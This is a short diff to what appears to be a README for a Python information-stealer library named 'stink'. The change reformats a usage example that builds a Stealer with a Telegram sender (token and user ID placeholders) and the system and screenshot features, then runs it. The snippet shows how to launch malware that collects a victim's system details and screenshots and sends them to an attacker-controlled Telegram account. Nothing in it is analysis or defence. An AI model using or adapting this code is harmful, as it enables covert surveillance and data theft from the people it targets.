@@ -66,8 +66,13 @@ from stink import Stealer, Features, Senders
 
 if __name__ == '__main__':
     Stealer(
-        senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)], 
-        features=[Features.system, Features.screenshot]
+        senders=[
+            Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)
+        ], 
+        features=[
+            Features.system,
+            Features.screenshot
+        ]
     ).run()
 ```
 ### Додаткові параметри
